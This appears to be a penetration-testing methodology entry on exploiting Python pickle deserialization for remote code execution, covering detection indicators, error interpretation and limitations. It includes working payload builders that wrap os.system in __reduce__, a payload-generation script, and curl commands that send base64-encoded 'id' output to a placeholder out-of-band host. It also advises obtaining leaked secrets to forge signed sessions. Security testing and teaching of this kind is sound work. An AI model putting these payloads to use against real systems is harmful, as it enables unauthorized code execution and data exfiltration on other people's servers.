# Python Pickle Deserialization

## Purpose

Test Python applications that deserialize attacker-controlled data with `pickle.loads()` or `cPickle.loads()`, enabling arbitrary code execution through the `__reduce__` protocol — by design in the pickle format.

## Applicability

- Python application (Flask, Django, FastAPI, custom)
- Cookie, session token, or parameter contains a base64-encoded opaque blob
- Application uses `pickle`, `cPickle`, `shelve`, or `joblib` to store/load user-influenced state
- ML/data science endpoints accepting serialized model files or feature vectors

## Preconditions

- User-controlled bytes (directly or via base64/hex decode) reach `pickle.loads()` or `cPickle.loads()`
- No cryptographic integrity verification on the blob, OR verification is weak/bypassable
- Python process has access to `os`, `subprocess`, or equivalent modules (nearly universal)

## Relevant Architecture

```
User input (cookie / POST param / file upload)
    → base64 / hex decode (optional)
    → pickle.loads(data)          ← sink
    → __reduce__ dispatch
    → arbitrary callable invoked with attacker-controlled args
    → os.system / subprocess / exec
```

Flask/Django session-specific path:
```
Signed session cookie
    → signature verification (itsdangerous / Django signing)
    → base64 decode of payload
    → pickle.loads()  ← if app customizes session serializer to pickle
```

## Technical Knowledge

**Pickle RCE mechanism**
Pickle opcodes can encode a `REDUCE` operation that calls any importable callable with arbitrary arguments. The `__reduce__` method on a class defines this:

```python
import pickle, os


class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))


payload = pickle.dumps(Exploit())
# base64.b64encode(payload) for transport
```

**Raw opcode approach (no class needed)**
```python
import pickle, os

payload = b"\x80\x04\x95" + ...  # PROTO 4 opcodes
# Or use pickletools to craft manually
```

**Minimal one-liner payload builder**
```python
import pickle, os, base64


def make_payload(cmd):
    class Exploit:
        def __reduce__(self):
            return (os.system, (cmd,))

    return base64.b64encode(pickle.dumps(Exploit())).decode()


print(make_payload("id"))
print(make_payload("curl http://<oast>/?x=$(id|base64)"))
```

**Protocol versions**
- `\x80\x02` — protocol 2 (Python 2/3 compat)
- `\x80\x04` — protocol 4 (Python 3.4+)
- `\x80\x05` — protocol 5 (Python 3.8+)
- Magic bytes for detection: first two bytes `80 0X` where X is protocol version

**shelve and joblib**
- `shelve` wraps pickle; files opened with `shelve.open()` are vulnerable if path/key is attacker-influenced
- `joblib.load()` uses pickle internally — ML model files from untrusted sources are RCE vectors

## Indicators

**Black-box**
- Cookie/session value decodes to bytes starting with `\x80\x02` through `\x80\x05`
- Application errors: `_pickle.UnpicklingError`, `AttributeError` during unpickling, `ModuleNotFoundError` for missing import
- Behavior changes when blob is truncated (pickle-specific parse error vs. generic error)
- Application stores and retrieves per-user objects in cookies without JWT/signing

**White-box**
```python
pickle.loads(data)
cPickle.loads(data)
pickle.load(file_obj)  # if file path is user-influenced
shelve.open(user_path)
joblib.load(user_path)
import pickle

obj = pickle.loads(base64.b64decode(cookie_value))
```

## Interpretation

1. **`_pickle.UnpicklingError`** when payload truncated → pickle sink confirmed
2. **`ModuleNotFoundError: No module named 'attacker_module'`** → pickle sink reached; crafted `__reduce__` importing nonexistent module triggered
3. **`AttributeError: module 'os' has no attribute 'badattr'`** → sink reached; `os` module resolved, attribute lookup failed → swap to valid function
4. **No error on truncated blob** → data may be verified/encrypted before deserialization
5. **OOB DNS/HTTP callback received** → code execution confirmed

## Security-Relevant Conditions

- **No signature on session**: Flask default session uses itsdangerous signing — if app replaces serializer with pickle, signing protects only if secret is unknown; obtain secret from source/env vars
- **`SECRET_KEY` leaked**: itsdangerous-signed pickle session is fully forgeable
- **File upload accepting `.pkl` or `.joblib`**: load path controlled → RCE via `joblib.load(user_uploaded_file)`
- **Redis/memcached caching pickled objects**: second-order path if cache key or namespace is user-influenced
- **`shelve` with user-supplied key prefix**: path traversal + deserialization combined

## Experiment Considerations

- Start with a DNS/HTTP OAST payload — `curl http://<oast>` or `nslookup <oast>` — before using `os.system('id')`
- Pickle is synchronous; if the command has output, capture it OOB (curl/wget callback) since it won't appear in the HTTP response in most cases
- For signed sessions: first confirm the signature check passes (no `BadSignature` error) — if it fails, application is protected unless secret is obtained
- Test with protocol 2 for broadest compatibility when target Python version is unknown

## Evidence Expectations

1. Crafted pickle payload (base64-encoded) sent in cookie/parameter
2. OOB callback received (DNS query or HTTP request) → arbitrary code execution confirmed
3. Optionally: output of `id`/`whoami`/`hostname` exfiltrated via HTTP callback
4. Document: parameter/cookie name, encoding scheme, protocol version used, Python version if determinable, whether signing was absent or bypassed

## Failure Interpretation

| Observation | Interpretation |
|-------------|---------------|
| `BadSignature` error | Session is signed and secret is valid; obtain secret or pivot |
| `_pickle.UnpicklingError: invalid load key` | Data is not pickle-encoded at this stage (maybe encrypted) |
| `ModuleNotFoundError` for os/subprocess | Unlikely — these are stdlib; check if restricted environment |
| No OOB callback, no error | Egress filtered; try time-based oracle (`time.sleep(5)`) |
| Process exits / 500 on all payloads | Possible sandbox or exception handler swallowing errors |

## False Positives

- Session signed with `itsdangerous` and secret is strong and private — payload would need to forge the signature
- Data base64-decoded but then passed to `json.loads()`, not `pickle.loads()` — verify the actual sink
- `pickle.loads()` called only on trusted server-generated data, not on user input (trace data flow carefully)
- Application uses `pickle.loads()` with `fix_imports=False` on protocol-5 only — protocol 2 payload fails; test matching protocol

## Limitations

- In restricted environments (e.g., `seccomp`, `AppArmor`, `nsjail`), `os.system` may be blocked — try `subprocess.check_output` or file write instead of exec
- Blind RCE (no OOB): if both DNS and HTTP are blocked, rely on timing (`time.sleep`) as oracle
- ML frameworks sometimes wrap pickle with schema checks — confirm actual deserialization path
- Python 2 vs. Python 3 protocol compatibility: protocol 3+ not loadable in Python 2; use protocol 2 for cross-version payloads

## Related Knowledge

- `python-yaml` — when sink is `yaml.load()` rather than `pickle.loads()`
- `signed-state` — when pickle blob is HMAC/itsdangerous-signed
- `second-order` — when pickle data is stored (cache, DB) and loaded later
- Django's session framework uses `json` by default, not pickle — verify custom session backends
- Flask's `itsdangerous` signs but does not encrypt; the payload is visible even if protected

## Tooling

```python
#!/usr/bin/env python3
# pickle_payload.py — generate pickle RCE payloads
import pickle, os, base64, sys


def make(cmd, proto=2):
    class E:
        def __reduce__(self):
            return (os.system, (cmd,))

    return base64.b64encode(pickle.dumps(E(), protocol=proto)).decode()


# OOB confirmation (safe — replace with interactsh host)
print("DNS/HTTP oracle:", make("curl http://<interactsh-host>/?q=$(id|base64 -w0)"))

# Timing oracle (if OOB blocked)
print("Timing oracle:", make("sleep 5"))

# Send via curl:
# curl -b "session=<payload>" https://target/
# or
# curl -d "data=<payload>" https://target/api
```